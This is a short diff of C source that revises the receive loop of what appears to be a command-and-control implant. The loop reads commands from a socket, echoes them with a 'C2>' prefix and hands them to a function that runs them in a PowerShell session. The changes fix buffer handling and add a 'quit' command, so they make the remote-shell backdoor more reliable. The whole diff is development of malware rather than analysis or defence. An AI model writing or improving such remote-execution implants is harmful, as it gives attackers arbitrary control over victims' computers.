@@ -65,20 +65,33 @@ int psh_exec(sock_t sock, const char *cmd) {
     return 0;
 }
 
-void psh_receive(char *cmd, sock_t sock, char *buf) {
+void psh_receive(sock_t sock, char *buf) {
+    char cmd[2048];
+
     while (1) {
         // Clear previous command contents
         memset(cmd, 0, sizeof(cmd));
         int i = 0;
-        // Read one byte at a time
+
         while (1) {
             int r = recv(sock, buf + i, 1, 0);
             if (r <= 0) break;
-            // When newline detected, terminate and copy into cmd buffer.
-            if (buf[i] == '\n') { buf[i] = '\0'; strcpy(cmd, buf); break; } 
+
+            if (buf[i] == '\n') {
+                buf[i] = '\0';
+                strcpy(cmd, buf); // safe if buf fits in cmd
+                break;
+            }
             i++;
+            if (i >= sizeof(cmd) - 1) { // prevent overflow
+                buf[i] = '\0';
+                strcpy(cmd, buf);
+                break;
+            }
         }
+
         if (!strlen(cmd)) continue;
+        if (strcmp(cmd, "quit") == 0) break; // Quit powershell session
         printf("C2> %s\n", cmd);
 
         if (psh_exec(sock, cmd) < 0) {
